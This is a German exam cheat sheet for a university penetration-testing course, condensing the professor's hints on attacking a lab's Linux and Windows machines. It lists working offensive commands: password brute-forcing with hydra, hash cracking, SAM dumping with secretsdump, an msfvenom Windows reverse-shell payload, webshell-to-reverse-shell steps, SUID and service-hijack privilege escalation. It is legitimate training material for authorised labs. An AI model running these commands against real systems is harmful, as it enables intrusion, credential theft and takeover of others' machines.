# 🎯 Prüfungs-Spickzettel (CY-B-26)

> Destillat der Hinweise, die der Prof übers Semester gegeben hat — geordnet, erklärt und
> in die jeweiligen Kapitel verlinkt. **Das hier zuerst lesen.** Reihenfolge ≈ Prüfungsablauf.

---

## 0. Rahmenbedingungen (was du erwarten kannst)

- **2 Maschinen:** eine **Linux**- und eine **Windows-11**-Maschine. Beide sind **direkt von
  Kali aus erreichbar** → **kein Pivoting, keine Firewall, kein Evasion** nötig.
- **Kali-Bordmittel reichen vollständig** — keine exotischen Tools nötig.
- **Keine UDP-Scans nötig.** `nmap -p- -T5` genügt.
- **Nicht erlaubt / kommt NICHT dran:** XSS, SQL-Injection, Burp Suite.
- **Kommt dran (laut Prof):** Authentication Bypass (Web), SMB (445/137), Password-Cracking
  (NTLMv2/MD5), msfvenom-Shellcode, EternalBlue (Python-Weg), Scheduled Tasks / Services
  (Windows-PrivEsc), SUID (Linux-PrivEsc), sensible Infos in Dateien/Backups/Mails, der
  **DemoCorp-Bericht IPT-001**.

---

## 1. Recon — erst scannen, nicht im Exploit verlieren

> **Prof-Hinweis:** "Maybe erstmal versuchen das System nach Vulnerabilities zu scannen,
> bevor man sich in einem Exploit verliert."

```bash
export RHOST=<ziel-ip>
export LHOST=$(ip a show tun0 | grep -oP '(?<=inet\s)\d+(\.\d+){3}')   # oder eth0 im Lab

# Voller Portscan (kein UDP nötig)
nmap -p- -T5 $RHOST -oN nmap_all.txt

# Auf gefundene Ports: Version + Default-Scripts
nmap -sV -sC -p <ports> $RHOST -oN nmap_detail.txt

# Web? -> Tech-Stack
whatweb http://$RHOST/
```

Danach **gezielt** entscheiden (Web? SMB? Service mit bekannter Version?) statt blind zu exploiten.
→ [Recon-Kapitel](../01-Exploration/README.md)

---

## 2. Sensible Informationen sammeln (der rote Faden der Prüfung)

> **Prof-Hinweis:** "Sensitive Informationen → Email, Text-Dateien etc., die Informationen
> zum Weitermachen enthalten." / "Eine Userin hat eine Anwendung benutzt und dort Hinweise
> hinterlegt." / "Backup-Dateien könnten Credentials im Klartext haben."

Die Prüfung ist eine Kette: ein Fund (Hinweis/Passwort/Datei) führt zum nächsten Schritt.
Immer systematisch nach hinterlegten Infos suchen:

```bash
# Linux — versteckte Dateien & interessante Orte
ls -la                                  # versteckte Dateien IMMER mit -la
ls -la /home/* /opt /var/www /srv /tmp
cat /home/*/.bash_history               # was hat der User getippt?
cat ~/.bash_history

# Mails (oft Hinweise/Notizen!)
ls -la /var/mail/ /var/spool/mail/; cat /var/mail/* 2>/dev/null

# Gezielte String-/Datei-Suche (vorgefertigt halten!)
grep -riE 'pass|pwd|user|key|token|cred' /home /var/www /opt /etc 2>/dev/null
find / -iname '*backup*' -o -iname '*.bak' -o -iname '*.old' 2>/dev/null
find / -iname '*.kdbx' -o -iname '*.txt' -o -iname '*notes*' 2>/dev/null
```

```cmd
:: Windows — versteckte Dateien & abgelegte Notizen
dir /a /s C:\Users\*                     :: /a zeigt versteckte
type C:\Users\*\Desktop\*.txt
powershell -c "Get-ChildItem C:\Users -Recurse -Force -Include *.txt,*.xml,*.ini,*.config,*.kdbx -EA SilentlyContinue"
powershell -c "Get-Content (Get-PSReadlineOption).HistorySavePath"   :: PowerShell-History
```

> **Backup-Strings** kommen laut Prof vor — darin liegen wichtige Daten. Such-Befehle für
> `root.txt`, `user.txt`, `backup`, `*.kdbx` **vorher** vorbereiten.
> Details: [Steganografie/versteckte Creds](../99-Resources/steganography.md) ·
> [Linux-Loot](../04-Post-Exploitation/Linux/README.md) · [Windows-Loot](../04-Post-Exploitation/Windows/README.md)

---

## 3. Passwörter & Hashes (großes Prüfungsthema)

> **Prof-Hinweise (gebündelt):** Passwortlisten mit John kommen *wahrscheinlich nicht* dran —
> stattdessen **selbst eine kleine Liste (5–10 Kandidaten) aus Hinweisen bauen** (Website,
> Maschine) und damit z.B. per **Hydra** einen User bruteforcen. NTLMv2 (Challenge-Response)
> kommt **stark wahrscheinlich** → **kein Pass-the-Hash möglich, muss geknackt werden**.
> Auch MD5 / Standard-PW-Hashes. `hash-identifier` benutzen. `crackstation` für bekannte
> Hashes. Default-Passwörter für Anwendungen nachschlagen. `keepass2john` / `pdf2john`.

### 3a. Eigene Wortliste aus Hinweisen bauen → Hydra

```bash
# Begriffe von der Website ziehen (Namen, Hobbys, Slogans)
cewl http://$RHOST/ -m 4 -w cewl.txt

# Oder von Hand 5-10 Kandidaten (aus Mails/Notizen/About-Seite) in candidates.txt
printf '%s\n' Sommer2024! Firmenname1 Hund2019 ILoveYou! > candidates.txt

# Mutationen drauf
hashcat --stdout candidates.txt -r /usr/share/hashcat/rules/best64.rule > muts.txt

# Damit User bruteforcen
hydra -l <user> -P muts.txt ssh://$RHOST -t4 -f -V
hydra -l <user> -P muts.txt $RHOST http-post-form "/login:user=^USER^&pass=^PASS^:F=Invalid"
```

### 3b. Hash erkennen & knacken

```bash
hash-identifier            # oder: hashid '<hash>'   /   nth '<hash>'

# MD5 / SHA1 etc. — erst crackstation.net probieren (Sekunden, wenn bekannt)
# Sonst lokal:
hashcat -m 0    md5.txt    /usr/share/wordlists/rockyou.txt     # MD5
hashcat -m 100  sha1.txt   rockyou.txt                          # SHA1
```

### 3c. NTLMv2 (Challenge-Response) — MUSS geknackt werden

NTLMv2 ist **nicht** PtH-fähig (im Gegensatz zum lokalen NTLM aus der SAM). Du fängst ihn
z.B. mit Responder/SMB ab oder findest ihn im Traffic, dann:

```bash
hashcat -m 5600 ntlmv2.txt /usr/share/wordlists/rockyou.txt    # Format 5600 = NetNTLMv2
john --format=netntlmv2 ntlmv2.txt --wordlist=rockyou.txt
```

> Lokaler **NTLM aus dem SAM-File** (`system32/config/SAM`) ist dagegen PtH-fähig — nicht
> verwechseln. SAM/SYSTEM ziehen → `impacket-secretsdump -sam sam -system system LOCAL`.

### 3d. Geschützte Container

```bash
keepass2john Database.kdbx > kp.hash && john --wordlist=rockyou.txt kp.hash
pdf2john   geheim.pdf       > pdf.hash && john --wordlist=rockyou.txt pdf.hash
zip2john   backup.zip       > zip.hash && john --wordlist=rockyou.txt zip.hash
```

> Default-Passwörter für Anwendungen: Herstellerdoku / Listen wie
> `seclists/Passwords/Default-Credentials/`. Voll: [Passwords & Hashes](../02-Exploitation/Passwords/README.md)

---

## 4. Web Application Exploits — **Authentication Bypass** (kommt sicher)

> **Prof-Hinweis:** "Authentication Bypass wird drankommen (Web Application Exploits)."
> Kein XSS, kein SQLi, kein Burp. Stattdessen: Logik-/Auth-Fehler, Default-Creds,
> versteckte Endpunkte, und **Webshell → Reverse Shell**.

```bash
# 1) Verzeichnisse/Endpunkte finden — GRÖSSERE Wortliste, nicht nur common.txt
gobuster dir -u http://$RHOST/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,bak -t50
whatweb http://$RHOST/

# 2) Auth-Bypass-Ideen (ohne SQLi):
#    - Default-/geratene Creds (admin:admin, in Notizen gefundene)
#    - direkter Aufruf geschützter Seiten (/admin, /dashboard) ohne Login
#    - Parameter-/Cookie-Manipulation (role=admin, isAuth=1, IDOR /user/2)
#    - HTTP-Verb wechseln, Header (X-Forwarded-For, Referer) setzen
#    - bekannter PoC zur App-Version (siehe Punkt 6)
```

**Webshell → Reverse Shell** (initial Access ist laut Prof ein Prüfungsweg):

```bash
# Upload erlaubt? PHP-Revshell hoch (pentestmonkey) und triggern
# Listener:
nc -nlvp 4444
# In der hochgeladenen shell.php: $ip = Kali, $port = 4444
```

> Wenn die Web-Shell als **Dienst** (www-data) läuft → erst **Shell upgraden**, sonst
> ins `home`-Verzeichnis für weitere Infos (Punkt 7).
> `curl` ist oft der bessere Exploit-Trigger als ein Python-PoC (Punkt 6).
> Voll: [Web Exploitation](../02-Exploitation/Web/README.md)

---

## 5. SMB (445 / 137) — kommt dran, auch nur als Info-Quelle

> **Prof-Hinweis:** "Port 445 und Port 137 → SMB-Ports kommt auch dran." / "SMB-Shares können
> Dateien und Informationen enthalten — muss kein Access-Exploit sein, reicht wenn dort Daten
> liegen." / "SMB wird auf der **Windows**-Maschine sein."

```bash
# Shares auflisten (Null-Session / guest)
smbclient -L //$RHOST/ -N
nxc smb $RHOST -u '' -p '' --shares
nxc smb $RHOST -u 'guest' -p '' --shares

# In einen Share und alles ziehen
smbclient //$RHOST/<share> -N
#   recurse ON; prompt OFF; mget *

# Volle Enum
enum4linux-ng -A $RHOST
```

Gefundene Dateien (Backups, .kdbx, Notizen, SAM-Kopien) → weiter bei Punkt 2/3.
Voll: [SMB](../01-Exploration/Services/smb.md)

---

## 6. Exploits, PoC & Metasploit

> **Prof-Hinweise:** Immer einen **PoC** suchen (vllt existiert für die Prüfungsmaschine schon
> ein Weg). **msfvenom**-Shellcode generieren. **EternalBlue** über den **Python-Weg**.
> **Errors nicht überbewerten** — Version checken, Fehler googeln, ggf. kompilieren.
> **Payload an OS anpassen** (Metasploit-Exploit gefunden, aber App läuft Linux statt Windows
> → Payload wechseln). **Staged vs. stageless** → passenden Listener starten.

```bash
# Vuln/PoC-Suche
searchsploit <produkt> <version>
searchsploit -m <id>        # PoC ins aktuelle Dir kopieren
# + Google: "<produkt> <version> exploit poc"

# Shellcode mit msfvenom (Beispiel Windows)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=4444 -f exe -o sh.exe

# WICHTIG: staged vs stageless -> richtiger Listener
#   shell/reverse_tcp        = staged   -> multi/handler mit SELBEM staged-payload
#   shell_reverse_tcp        = stageless-> nc -lvnp ODER handler mit stageless-payload
```

**Payload an OS anpassen:** Wenn ein Metasploit-Modul per Default einen Windows-Payload setzt,
die Ziel-App aber Linux ist (oder umgekehrt):

```
set PAYLOAD linux/x64/meterpreter/reverse_tcp     # statt windows/...
set LHOST tun0 ; set LPORT 4444 ; run
```

**EternalBlue (Python-Weg)** und **curl als Trigger** sind eigene, ausführliche Kapitel:
→ [EternalBlue MS17-010 (manuell/AutoBlue)](../02-Exploitation/Windows/eternalblue-ms17-010.md) ·
[msfvenom](../99-Resources/msfvenom.md) · [Metasploit/Windows](../02-Exploitation/Windows/README.md)

> **Error-Mindset:** Ein Exploit, der einen Fehler wirft, ist nicht automatisch der falsche.
> Python-Version prüfen (`python2` vs `python3`), Fehlermeldung googeln, ggf. Kompilier-Flags
> anpassen. → [Python-Versionen & Kompilier-Fallen](./troubleshooting.md)

---

## 7. Shell-Handling — weak shell zuerst stabilisieren

> **Prof-Hinweis:** "Es kann sein, dass man erst eine Weak-Shell bekommt, die man verbessern
> muss." / "Web-Shell als Dienst → Shell upgraden, sonst ins Home-Verzeichnis."

```bash
# Linux: dumme Shell -> PTY
python3 -c 'import pty;pty.spawn("/bin/bash")'   # oder: script -qc /bin/bash /dev/null
# Ctrl+Z  ->  stty raw -echo; fg  ->  export TERM=xterm
```

Danach erst Infos sammeln (Punkt 2) und PrivEsc (Punkt 8).
Voll: [Shell-Upgrade](../99-Resources/shell-upgrade.md)

---

## 8. Privilege Escalation — der Standard-Ablauf

> **Prof-Ablauf (wörtlich sinngemäß):** "Erstmal schauen *wo bin ich, wer bin ich*, gibt es
> andere User, Dateien/Mails mit Hinweisen. Mit `sudo -l` Rechte prüfen → bei **GTFOBins**
> checken. **linpeas** *oder* **PrivescCheck** laufen lassen, Ergebnisse ebenfalls bei
> GTFOBins prüfen. Kann ich direkt den User wechseln? Reused Passwords? **SUID-Binaries**
> suchen → GTFOBins."

```bash
# Orientierung
id; whoami; hostname; uname -a; sudo -l
ls -la; cat ~/.bash_history

# Automatisiert — NICHT nur linpeas, auch PrivescCheck (Windows)
./linpeas.sh | tee linpeas.out
# Windows:  . .\PrivescCheck.ps1 ; Invoke-PrivescCheck
```

**Wichtige Sonderfälle, die laut Prof drankommen:**

- **SUID, um nur `root.txt` zu lesen** — man wird nicht immer voll root, bekommt aber per
  GTFOBins-SUID/`-p` (euid=root) Leserechte. Reicht für die Flag:
  ```bash
  find / -perm -4000 -type f 2>/dev/null      # SUID finden -> GTFOBins
  ./<suid-binary> ... -> /bin/sh -p           # euid root -> cat /root/root.txt
  ```
- **Windows Scheduled Task** — ein als höher privilegiert laufender Task führt ein Skript aus,
  das du evtl. **bearbeiten** kannst:
  ```cmd
  schtasks /query /fo LIST /v | findstr /i "Task To Run Run As"
  :: schreibbares Skript? -> eigenen Payload reinlegen -> auf nächsten Lauf warten
  ```
- **Windows Service mit schwachen Rechten** — Dienst läuft als SYSTEM, aber ein normaler User
  darf ihn ändern/neu starten:
  ```cmd
  sc qc <service>                                  :: läuft als?
  :: PrivescCheck zeigt "modification rights" -> binPath umbiegen -> neu starten
  ```
- **Reused Passwords / User-Wechsel** — jedes gefundene Passwort gegen **alle** User/Dienste testen.

Voll: [Linux PrivEsc](../03-PrivEsc/Linux/README.md) · [Windows PrivEsc](../03-PrivEsc/Windows/README.md)

---

## 9. Meterpreter-Quickies (wenn MSF im Spiel)

```
hashdump                 # zeigt User + Hashes (lokale NTLM)
getuid ; getprivs ; sysinfo
shell                    # in cmd/sh wechseln
```

> Eine **Meterpreter-Shell über eine Web-Anwendung** passt laut Prof "genau" — also Webshell
> → Meterpreter ist ein erwartbarer Weg.

---

## 10. Der Bericht — DemoCorp **IPT-001**

> **Prof-Hinweis:** "IPT-001 beim DemoCorp-Bericht als Hinweis **kommt in der Prüfung dran**."

Eigene Datei mit der exakt erwarteten Struktur (Ansprechpartner, Scope, Executive Summary,
Risk-Faktoren mit Likelihood+Impact, Walkthrough, Findings **pro VM** mit Risk-Begründung +
PoC + Referenzen + betroffene Systeme, Remediation, Action-Plan):
→ **[DemoCorp-Bericht / IPT-001](../05-Reporting/democorp-report.md)**

---

## 📌 Referenz-Seiten, die der Prof empfiehlt

- [HackTricks](https://book.hacktricks.xyz/) — "da ist etwas dabei, was man braucht"
- [GTFOBins](https://gtfobins.github.io/) — SUID/sudo/Binaries ausnutzen
- [Windows LPE Cookbook](https://github.com/nickvourd/Windows-Local-Privilege-Escalation-Cookbook) — Windows-PrivEsc
- [crackstation.net](https://crackstation.net/) — schnelles Hash-Lookup
- [revshells.com](https://www.revshells.com/) — Reverse-Shell-Generator
- [exploit-db / searchsploit](https://www.exploit-db.com/) — PoCs

---

## ✅ Prüfungs-Ablauf in einem Satz

`nmap -p- -T5` → Web/SMB/Service enumerieren (whatweb, gobuster-big, smbclient) → sensible
Infos sammeln (Mails/Backups/hidden files) → Auth-Bypass **oder** Webshell **oder** PoC/msfvenom
→ ggf. Shell upgraden → `wer/wo bin ich` + `sudo -l`/PrivescCheck + SUID/GTFOBins/Scheduled-Task
→ root.txt & user.txt → **alles im DemoCorp-Stil dokumentieren**.
